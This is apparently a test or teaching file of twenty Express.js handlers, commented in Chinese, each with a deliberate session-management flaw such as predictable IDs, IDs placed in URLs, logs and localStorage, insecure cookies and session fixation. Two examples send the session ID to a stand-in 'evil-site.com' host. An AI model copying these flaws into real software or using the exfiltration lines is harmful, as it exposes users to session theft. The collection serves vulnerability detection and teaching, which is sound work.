// Session Hijacking 漏洞示例文件

import express from 'express';
import crypto from 'crypto';

// 示例 1: 使用可预测的会话ID
export function sessionHijackingExample1() {
  const app = express();
  
  // 危险：使用可预测的会话ID生成机制
  app.use((req, res, next) => {
    if (!req.sessionID) {
      // 危险：使用简单的计数器或时间戳作为会话ID
      const predictableId = `session_${Date.now()}`;
      req.sessionID = predictableId;
    }
    next();
  });
  
  app.get('/predictable-session', (req, res) => {
    res.json({ sessionId: req.sessionID });
  });
  
  return app;
}

// 示例 2: 在URL中传输会话ID
export function sessionHijackingExample2() {
  const app = express();
  
  app.get('/transfer-session-url', (req, res) => {
    // 危险：将会话ID放在URL中
    const sessionId = req.sessionID;
    const returnUrl = req.query.returnUrl || '/dashboard';
    const hijackableUrl = `${returnUrl}?session=${sessionId}`;
    
    res.send(`
      <p>Continue to <a href="${hijackableUrl}">dashboard</a></p>
      <p>Warning: Session ID exposed in URL: ${sessionId}</p>
    `);
  });
  
  return app;
}

// 示例 3: 使用弱加密算法生成会话ID
export function sessionHijackingExample3() {
  const app = express();
  
  // 危险：使用不安全的随机数生成器
  function weakSessionId() {
    // 危险：使用Math.random()而不是加密安全的随机数
    return 'sess_' + Math.floor(Math.random() * 1000000000).toString(36);
  }
  
  app.use((req, res, next) => {
    if (!req.sessionID) {
      req.sessionID = weakSessionId();
    }
    next();
  });
  
  app.get('/weak-session', (req, res) => {
    res.json({ sessionId: req.sessionID, warning: 'Predictable session ID' });
  });
  
  return app;
}

// 示例 4: 在日志中记录会话ID
export function sessionHijackingExample4() {
  const app = express();
  
  app.use((req, res, next) => {
    // 危险：在日志中记录会话ID
    console.log(`Request from session: ${req.sessionID}, IP: ${req.ip}, User-Agent: ${req.get('User-Agent')}`);
    next();
  });
  
  app.get('/logged-session', (req, res) => {
    req.session.visitedLoggedPage = true;
    res.send('Session activity logged');
  });
  
  return app;
}

// 示例 5: 使用GET方法传输敏感会话信息
export function sessionHijackingExample5() {
  const app = express();
  
  app.get('/sensitive-action', (req, res) => {
    // 危险：通过GET请求传输会话相关的敏感信息
    const action = req.query.action;
    const sessionId = req.query.sessionId; // 危险：会话ID在URL中
    
    if (action === 'transfer' && sessionId) {
      // 模拟敏感操作
      req.session.lastAction = action;
      req.session.actionTime = new Date();
    }
    
    res.json({ 
      status: 'processed', 
      action,
      sessionIdExposed: !!sessionId
    });
  });
  
  return app;
}

// 示例 6: 不安全的会话存储
export function sessionHijackingExample6() {
  const app = express();
  
  // 危险：将会话数据存储在客户端且未适当保护
  app.use((req, res, next) => {
    const sessionCookie = req.cookies['unsafe-session'];
    if (sessionCookie) {
      try {
        // 危险：简单解码而非解密验证
        const decoded = Buffer.from(sessionCookie, 'base64').toString();
        req.session = JSON.parse(decoded);
      } catch (e) {
        req.session = {};
      }
    } else {
      req.session = {};
      // 危险：将会话数据简单编码后发送给客户端
      const encoded = Buffer.from(JSON.stringify(req.session)).toString('base64');
      res.cookie('unsafe-session', encoded, { httpOnly: false }); // httpOnly: false 是危险的
    }
    next();
  });
  
  app.get('/unsafe-storage', (req, res) => {
    req.session.data = { user: 'hacker', level: 'admin' };
    res.json({ session: req.session });
  });
  
  return app;
}

// 示例 7: HTTP和HTTPS混合使用会话
export function sessionHijackingExample7() {
  const app = express();
  
  app.use((req, res, next) => {
    // 危险：不在安全连接上强制使用secure cookie
    const isSecure = req.secure || req.headers['x-forwarded-proto'] === 'https';
    if (!isSecure) {
      console.warn('Insecure connection - session cookie may be transmitted over HTTP');
    }
    next();
  });
  
  app.get('/mixed-transport', (req, res) => {
    // 危险：即使在非HTTPS连接上也设置会话cookie而不使用secure标志
    req.session.insecureAccess = true;
    res.cookie('session-data', req.sessionID, { 
      httpOnly: true,
      secure: false,  // 危险：即使在HTTPS上也不强制secure
      sameSite: 'lax'
    });
    
    res.send('Session accessible over HTTP');
  });
  
  return app;
}

// 示例 8: 缺少适当的会话过期机制
export function sessionHijackingExample8() {
  const app = express();
  
  app.use((req, res, next) => {
    // 危险：永不自动过期会话
    req.session.lastActivity = new Date();
    // 危险：没有设置过期时间
    next();
  });
  
  app.get('/no-expiry', (req, res) => {
    req.session.permenant = true;
    res.send('Session never expires');
  });
  
  return app;
}

// 示例 9: 通过Referrer头泄露会话信息
export function sessionHijackingExample9() {
  const app = express();
  
  app.use((req, res, next) => {
    const referrer = req.get('Referer');
    if (referrer) {
      // 危险：某些情况下，会话相关信息可能通过Referrer泄露
      console.log(`User came from: ${referrer}, current session: ${req.sessionID}`);
    }
    next();
  });
  
  app.get('/referrer-leak', (req, res) => {
    // 危险：页面可能包含指向外部站点的链接，这些链接的Referrer头可能包含会话信息
    res.send(`
      <a href="http://evil-site.com/steal-session?current=${req.sessionID}">External link</a>
      <p>Current session: ${req.sessionID}</p>
    `);
  });
  
  return app;
}

// 示例 10: 会话ID重用
export function sessionHijackingExample10() {
  const app = express();
  
  // 危险：允许重用旧的会话ID
  app.get('/reuse-session', (req, res) => {
    const oldSessionId = req.query.oldId;
    if (oldSessionId) {
      // 危险：允许指定使用旧的会话ID
      req.session.previousId = oldSessionId;
      req.session.reused = true;
    }
    res.json({ 
      currentId: req.sessionID, 
      reusedOldId: oldSessionId,
      warning: 'Session ID reuse detected'
    });
  });
  
  return app;
}

// 示例 11: 不安全的会话传输 - 通过邮件发送会话链接
export function sessionHijackingExample11() {
  const app = express();
  
  app.post('/send-session-email', (req, res) => {
    // 危险：通过电子邮件发送包含会话ID的链接
    const email = req.body.email;
    const sessionId = req.sessionID;
    const loginUrl = `${req.protocol}://${req.get('host')}/auto-login?session=${sessionId}`;
    
    // 模拟发送包含会话ID的邮件
    console.log(`Sending email to ${email} with login URL: ${loginUrl}`);
    
    res.json({ 
      status: 'email_sent', 
      loginUrl, // 危险：返回完整的登录URL
      sessionId // 危险：直接暴露会话ID
    });
  });
  
  return app;
}

// 示例 12: 在错误消息中泄露会话信息
export function sessionHijackingExample12() {
  const app = express();
  
  app.get('/error-with-session-info', (req, res) => {
    try {
      // 故意制造错误以展示会话信息泄露
      throw new Error(`Session ID: ${req.sessionID}, User: ${req.session.user || 'anonymous'}`);
    } catch (error) {
      // 危险：错误消息中包含会话信息
      res.status(500).send(`Error occurred: ${error.message}`);
    }
  });
  
  return app;
}

// 示例 13: 通过表单隐藏字段传输会话ID
export function sessionHijackingExample13() {
  const app = express();
  
  app.get('/form-with-session', (req, res) => {
    // 危险：在隐藏表单字段中传输会话ID
    res.send(`
      <form method="POST" action="/process-form">
        <input type="hidden" name="sessionId" value="${req.sessionID}" />
        <input type="text" name="data" placeholder="Enter data" />
        <button type="submit">Submit</button>
      </form>
      <p>Session ID in form: ${req.sessionID}</p>
    `);
  });
  
  app.post('/process-form', (req, res) => {
    const sessionId = req.body.sessionId; // 危险：接收来自表单的会话ID
    if (sessionId) {
      req.session.processedWithId = sessionId;
    }
    res.send('Form processed');
  });
  
  return app;
}

// 示例 14: 通过AJAX请求暴露会话ID
export function sessionHijackingExample14() {
  const app = express();
  
  app.get('/ajax-session-endpoint', (req, res) => {
    // 危险：在AJAX响应中包含会话ID
    res.json({
      sessionId: req.sessionID,
      userData: req.session.userData || {},
      timestamp: new Date(),
      // 危险：返回完整的会话ID
    });
  });
  
  return app;
}

// 示例 15: 不安全的第三方集成
export function sessionHijackingExample15() {
  const app = express();
  
  app.get('/third-party-integration', (req, res) => {
    // 危险：与第三方集成时暴露会话信息
    const callbackUrl = req.query.callback;
    const sessionId = req.sessionID;
    
    if (callbackUrl) {
      // 构建带有会话ID的回调URL
      const trackingUrl = new URL(callbackUrl);
      trackingUrl.searchParams.set('session', sessionId);
      trackingUrl.searchParams.set('user', req.session.user || 'anonymous');
      
      // 危险：向第三方服务暴露会话信息
      res.redirect(trackingUrl.toString());
    } else {
      res.send('No callback provided');
    }
  });
  
  return app;
}

// 示例 16: 客户端存储的会话信息
export function sessionHijackingExample16() {
  const app = express();
  
  app.get('/client-storage', (req, res) => {
    // 危险：将会话相关信息存储在localStorage
    req.session.token = crypto.randomBytes(32).toString('hex');
    
    res.send(`
      <script>
        // 危险：将会话token存储在localStorage
        localStorage.setItem('sessionToken', '${req.session.token}');
        localStorage.setItem('sessionId', '${req.sessionID}');
        
        // 危险：通过JS访问会话信息
        console.log('Session ID:', '${req.sessionID}');
        console.log('Session token:', '${req.session.token}');
      </script>
      <p>Session info stored in client storage</p>
    `);
  });
  
  return app;
}

// 示例 17: 通过WebSocket暴露会话信息
export function sessionHijackingExample17() {
  const app = express();
  
  app.get('/websocket-info', (req, res) => {
    // 危险：在WebSocket连接信息中暴露会话数据
    res.send(`
      <script>
        // 危险：在客户端JS中暴露会话ID
        const sessionId = '${req.sessionID}';
        const ws = new WebSocket('ws://evil-site.com/steal?session=' + sessionId);
      </script>
    `);
  });
  
  return app;
}

// 示例 18: 会话固定和劫持组合攻击
export function sessionHijackingExample18() {
  const app = express();
  
  app.get('/session-fixation-hijacking', (req, res) => {
    const forcedId = req.query.forceId || req.session.forcedId;
    if (forcedId) {
      // 危险：允许强制设置会话ID（会话固定）
      req.session.forcedId = forcedId;
    }
    
    // 危险：在多个地方暴露会话ID（劫持）
    res.send(`
      <html>
      <body>
        <p>Your session ID: ${req.sessionID}</p>
        <p>Force ID: ${forcedId || 'none'}</p>
        <a href="/page2?session=${req.sessionID}">Next page</a>
        <form action="/submit" method="POST">
          <input type="hidden" name="session" value="${req.sessionID}" />
          <input type="submit" value="Submit" />
        </form>
        <script>
          // 危险：通过JS访问会话ID
          document.title = 'Session: ${req.sessionID}';
        </script>
      </body>
      </html>
    `);
  });
  
  return app;
}

// 示例 19: 基于IP的会话验证不足
export function sessionHijackingExample19() {
  const app = express();
  
  app.use((req, res, next) => {
    // 危险：仅轻微检查IP变化
    if (req.session.ip && req.session.ip !== req.ip) {
      console.log(`IP changed from ${req.session.ip} to ${req.ip}, but continuing anyway`);
      // 危险：发现IP变化但不采取行动
    }
    req.session.ip = req.ip;
    next();
  });
  
  app.get('/weak-ip-validation', (req, res) => {
    res.json({ 
      sessionId: req.sessionID,
      currentIP: req.ip,
      storedIP: req.session.ip,
      warning: 'IP changes not properly validated'
    });
  });
  
  return app;
}

// 示例 20: 复合会话劫持攻击
export function sessionHijackingExample20() {
  const app = express();
  
  // 组合多种会话劫持技术
  app.use((req, res, next) => {
    // 技术1: 可预测的ID生成
    if (!req.session.customId) {
      req.session.customId = `pred_${Math.floor(Date.now()/1000)}`;
    }
    
    // 技术2: 在多个地方暴露会话信息
    req.session.exposurePoints = [];
    
    next();
  });
  
  app.get('/comprehensive-hijack', (req, res) => {
    const sessionId = req.sessionID;
    const customId = req.session.customId;
    
    // 多种暴露方式：
    // 1. URL参数
    // 2. HTML内容
    // 3. JS变量
    // 4. 表单字段
    // 5. 日志记录
    
    console.log(`Comprehensive hijack endpoint accessed with session: ${sessionId}, custom: ${customId}`);
    
    res.send(`
      <!DOCTYPE html>
      <html>
      <head>
        <title>Session Hijacking Playground</title>
      </head>
      <body>
        <h1>Session Information</h1>
        <p>Session ID: ${sessionId}</p>
        <p>Custom ID: ${customId}</p>
        
        <!-- URL exposure -->
        <a href="/next?session=${sessionId}&custom=${customId}">Next Page</a>
        
        <!-- Form exposure -->
        <form id="exposedForm" action="/process" method="POST">
          <input type="hidden" name="session" value="${sessionId}" />
          <input type="hidden" name="custom" value="${customId}" />
          <input type="hidden" name="user_data" value="sensitive_info" />
          <button type="submit">Submit Form</button>
        </form>
        
        <!-- JS exposure -->
        <script>
          var GLOBAL_SESSION_ID = '${sessionId}';
          var GLOBAL_CUSTOM_ID = '${customId}';
          
          document.addEventListener('DOMContentLoaded', function() {
            // Additional exposure through DOM manipulation
            console.log('Session IDs:', GLOBAL_SESSION_ID, GLOBAL_CUSTOM_ID);
            
            // Potential XSS vector
            document.title = 'Session: ' + GLOBAL_SESSION_ID;
          });
          
          // AJAX exposure
          fetch('/api/session-info', {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
              sessionId: '${sessionId}',
              customId: '${customId}',
              action: 'expose_all'
            })
          });
        </script>
        
        <!-- Referrer leak potential -->
        <a href="http://third-party-site.com/redirect?from_session=${sessionId}">External Link</a>
        
        <!-- LocalStorage exposure -->
        <script>
          localStorage.setItem('currentSessionId', '${sessionId}');
          localStorage.setItem('currentCustomId', '${customId}');
        </script>
      </body>
      </html>
    `);
    
    req.session.exposurePoints.push({
      method: 'comprehensive_exposure',
      time: new Date(),
      sessionId,
      customId
    });
  });
  
  app.post('/process', (req, res) => {
    // Process request with exposed session info
    const sessionId = req.body.session;
    const customId = req.body.custom;
    
    res.json({
      receivedSessionId: sessionId,
      receivedCustomId: customId,
      processingResult: 'session_info_received',
      timestamp: new Date()
    });
  });
  
  return app;
}
